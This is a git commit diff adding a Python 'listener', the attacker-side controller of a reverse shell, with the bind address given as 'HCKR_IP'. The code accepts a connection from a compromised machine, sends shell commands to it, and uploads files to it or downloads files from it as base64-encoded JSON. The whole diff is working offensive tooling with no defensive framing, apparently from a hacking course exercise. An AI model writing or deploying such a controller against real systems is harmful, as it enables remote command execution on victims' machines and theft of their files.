e0d455d607f21fbbf996bfc4510b9001afa89c40
Diego Gramond <diego.pegramm@gmail.com>
2024-09-20 01:45:29 -0600

    finished the listener program

--- listener.py
+++ listener.py
@@ -1,7 +1,6 @@
-#!/usr/bin/env python
-
 import socket
-
+import json
+import base64
 
 class Listener:
     def __init__(self, ip, port):
@@ -9,21 +8,55 @@ class Listener:
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind((ip, port))
         listener.listen(0)
-        print("[-] Waiting for incoming connections")
-        self.con, address = listener.accept()
-        print(f"[+] Connected with {str(address[0])}")
+        print("[+] Waiting for connections.")
+        self.con, addr = listener.accept()
+        print(f"[+] Connection established with {str(addr[0])}")
 
-    def execute_remotely(self, command):
-        self.con.send(command.encode())
-        return self.con.recv(1024).decode()
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.con.send(json_data.encode())
 
+    def reliable_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.con.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def write_file(self, path, data):
+        with open(path, "wb") as file:
+            file.write(data)
+            return "[+] Download successful"
+
+    def exec_remote(self, command):
+        self.reliable_send(command)
+        if command[0] == "exit":
+            self.con.close()
+            exit()
+        return self.reliable_receive()
 
     def run(self):
         while True:
             command = input(">> ")
-            result = self.execute_remotely(command)
+            command = command.split(" ")
+
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1]).decode()
+                    command.append(file_content)
+                result = self.exec_remote(command)
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = base64.b64decode(result)
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error during command execution"
             print(result)
 
-
-listener = Listener("YOUR_IP", PORT)
+listener = Listener("HCKR_IP", PORT)
 listener.run()
